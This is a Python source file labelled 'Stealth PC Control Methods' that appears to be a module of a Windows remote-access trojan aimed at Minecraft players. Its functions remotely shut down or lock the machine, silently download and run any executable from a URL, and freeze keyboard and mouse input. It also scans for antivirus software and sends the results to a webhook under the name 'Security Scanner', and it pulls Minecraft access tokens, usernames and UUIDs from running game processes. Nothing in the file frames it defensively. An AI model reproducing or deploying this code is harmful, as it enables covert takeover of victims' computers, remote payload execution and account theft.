# control_methods.py - Stealth PC Control Methods
import socket
import random
import threading
import time
import ctypes
from ctypes import wintypes
import os
import subprocess
import tempfile
import winreg
import winsound
import psutil
import re
import json
from datetime import datetime
import urllib.request

# Global variables for input blocking
_input_blocked = False

def _block_input(block):
    """Block or unblock keyboard and mouse input"""
    try:
        ctypes.windll.user32.BlockInput(block)
        return True
    except Exception:
        return False

def _get_antivirus_info():
    """Comprehensive antivirus detection"""
    av_list = []
    
    # Check Windows Security Center
    try:
        import wmi
        c = wmi.WMI(namespace="root\\SecurityCenter2")
        for product in c.AntiVirusProduct():
            av_list.append(product.displayName)
    except:
        pass
    
    # Common antivirus registry paths
    av_registry_paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Malwarebytes"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Norton"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Symantec"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\McAfee"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Kaspersky"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Bitdefender"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Avast"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\AVG"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\ESET"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TrendMicro"),
    ]
    
    # AV product names to look for
    av_names = [
        "Windows Defender", "Malwarebytes", "Norton", "Symantec", "McAfee",
        "Kaspersky", "Bitdefender", "Avast", "AVG", "ESET", "Trend Micro",
        "Sophos", "Panda", "Avira", "Comodo", "Webroot", "ZoneAlarm"
    ]
    
    # Check registry for AV products
    for hive, path in av_registry_paths:
        try:
            key = winreg.OpenKey(hive, path)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        for av_name in av_names:
                            if av_name.lower() in str(display_name).lower():
                                if display_name not in av_list:
                                    av_list.append(display_name)
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
    
    # Check running AV processes
    av_processes = [
        "MsMpEng.exe", "NisSrv.exe", "MBAMService.exe", "mbam.exe",
        "ccSvcHst.exe", "ns.exe", "mcshield.exe", "mfefire.exe",
        "avp.exe", "avpui.exe", "vsserv.exe", "bdagent.exe",
        "avastui.exe", "afwServ.exe", "avgui.exe", "avgsvc.exe",
        "ekrn.exe", "egui.exe", "ntrtscan.exe", "tmccsf.exe"
    ]
    
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [p.lower() for p in av_processes]:
                process_name = proc.info['name']
                if process_name not in av_list:
                    av_list.append(f"Running: {process_name}")
        except:
            pass
    
    # Check Windows Defender specifically
    try:
        defender_path = r"SOFTWARE\Microsoft\Windows Defender"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, defender_path)
        winreg.CloseKey(key)
        if "Windows Defender" not in str(av_list):
            av_list.append("Windows Defender")
    except:
        pass
    
    return av_list

def _send_to_webhook(webhook_url, data):
    """Send data to webhook"""
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        payload = {
            'content': f"Antivirus Scan Results:\n```{data}```",
            'username': 'Security Scanner'
        }
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode('utf-8'),
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.status == 200
    except Exception:
        return False

def attack_controlpc(target, duration=60):
    """Remote control PC functions"""
    parts = target.split('|')
    command = parts[0]
    
    try:
        if command == "shutdown":
            subprocess.run(["shutdown", "/s", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "restart":
            subprocess.run(["shutdown", "/r", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            
        elif command == "logoff":
            subprocess.run(["shutdown", "/l", "/f"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "close_minecraft":
            subprocess.run(["taskkill", "/f", "/im", "javaw.exe"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "popup":
            if len(parts) > 1:
                message = parts[1]
                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x00001000)
                
        elif command == "download_execute":
            if len(parts) > 1:
                url = parts[1]
                import urllib.request
                
                temp_dir = tempfile.mkdtemp()
                file_name = url.split('/')[-1] or "file.exe"
                file_path = os.path.join(temp_dir, file_name)
                
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                req = urllib.request.Request(url, headers=headers)
                
                with urllib.request.urlopen(req) as response, open(file_path, 'wb') as out_file:
                    out_file.write(response.read())
                
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.Popen(file_path, startupinfo=startupinfo, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
        elif command == "freeze_keyboard":
            _block_input(True)
            
        elif command == "freeze_mouse":
            _block_input(True)
            
        elif command == "freeze_both":
            _block_input(True)
            
        elif command == "unfreeze":
            _block_input(False)
            
        elif command == "check_av":
            if len(parts) > 1:
                webhook_url = parts[1]
                av_list = _get_antivirus_info()
                
                if av_list:
                    av_text = "\n".join(av_list)
                    result = f"Antivirus Software Found:\n{av_text}"
                else:
                    result = "No known antivirus software detected"
                
                # Send to webhook
                _send_to_webhook(webhook_url, result)
                
        elif command == "troll":
            if len(parts) > 1:
                troll_cmd = parts[1]
                
                if troll_cmd == "open_cd":
                    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
                    
                elif troll_cmd == "swap_mouse":
                    current = ctypes.windll.user32.GetSystemMetrics(23)
                    ctypes.windll.user32.SwapMouseButton(not current)
                    
                elif troll_cmd == "rotate_screen":
                    device = ctypes.windll.user32.EnumDisplayDevicesW(None, 0, 0)
                    ctypes.windll.user32.ChangeDisplaySettingsExW(device.DeviceName, None, None, 0x00000004 | 0x00000002, None)
                    
                elif troll_cmd == "invert_colors":
                    SPI_SETHIGHCONTRAST = 0x0043
                    HCF_HIGHCONTRASTON = 0x00000001
                    class HIGHCONTRAST(ctypes.Structure):
                        _fields_ = [('cbSize', ctypes.c_uint),
                                   ('dwFlags', ctypes.c_uint),
                                   ('lpszDefaultScheme', ctypes.c_wchar_p)]
                    hc = HIGHCONTRAST()
                    hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
                    hc.dwFlags = HCF_HIGHCONTRASTON
                    hc.lpszDefaultScheme = None
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
                    
                elif troll_cmd == "mouse_jiggler":
                    def jiggle_mouse():
                        while True:
                            x = random.randint(0, 1920)
                            y = random.randint(0, 1080)
                            ctypes.windll.user32.SetCursorPos(x, y)
                            time.sleep(30)
                    
                    thread = threading.Thread(target=jiggle_mouse, daemon=True)
                    thread.start()
                    
                elif troll_cmd == "keyboard_spam":
                    def spam_keys():
                        while True:
                            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
                            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
                            time.sleep(10)
                    
                    thread = threading.Thread(target=spam_keys, daemon=True)
                    thread.start()
                    
                elif troll_cmd == "play_sound":
                    winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
                    
                elif troll_cmd == "change_wallpaper":
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
        
    except Exception:
        pass

def attack_refresh_session_id(target, duration=0):
    """Extract Minecraft session information"""
    try:
        session_data = {
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'sessions': []
        }
        
        def find_minecraft_processes():
            minecraft_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'].lower() == 'javaw.exe':
                        cmdline = ' '.join(proc.info['cmdline'] or [])
                        minecraft_indicators = ['net.minecraft.client.main', '--username', '--uuid', '--version']
                        if any(indicator in cmdline for indicator in minecraft_indicators):
                            minecraft_processes.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return minecraft_processes
        
        def extract_session_info(process):
            try:
                cmdline = ' '.join(process.info['cmdline'] or [])
                
                session_patterns = [
                    r'--session\s+([^\s]+)',
                    r'--session=([^\s]+)',
                    r'-Dsessionid=([^\s]+)',
                    r'--accessToken\s+([^\s]+)',
                    r'--accessToken=([^\s]+)',
                    r'-DaccessToken=([^\s]+)',
                ]
                
                username_pattern = r'--username[=\s]?([^\s]+)'
                uuid_pattern = r'--uuid[=\s]?([^\s]+)'
                version_pattern = r'--version[=\s]?([^\s]+)'
                
                session_id = None
                for pattern in session_patterns:
                    match = re.search(pattern, cmdline)
                    if match:
                        session_id = match.group(1)
                        break
                
                username_match = re.search(username_pattern, cmdline)
                uuid_match = re.search(uuid_pattern, cmdline)
                version_match = re.search(version_pattern, cmdline)
                
                return {
                    'pid': process.info['pid'],
                    'session_id': session_id if session_id else 'Not found',
                    'username': username_match.group(1) if username_match else 'Unknown',
                    'uuid': uuid_match.group(1) if uuid_match else 'Unknown',
                    'version': version_match.group(1) if version_match else 'Unknown',
                    'found': session_id is not None
                }
                
            except Exception as e:
                return {'error': str(e), 'found': False}
        
        processes = find_minecraft_processes()
        for process in processes:
            session_info = extract_session_info(process)
            session_data['sessions'].append(session_info)
        
        session_data['success'] = len(session_data['sessions']) > 0
        session_data['process_count'] = len(session_data['sessions'])
        
        return f"SESSION_DATA:{json.dumps(session_data)}"
        
    except Exception as e:
        error_data = {
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }
        return f"SESSION_DATA:{json.dumps(error_data)}"
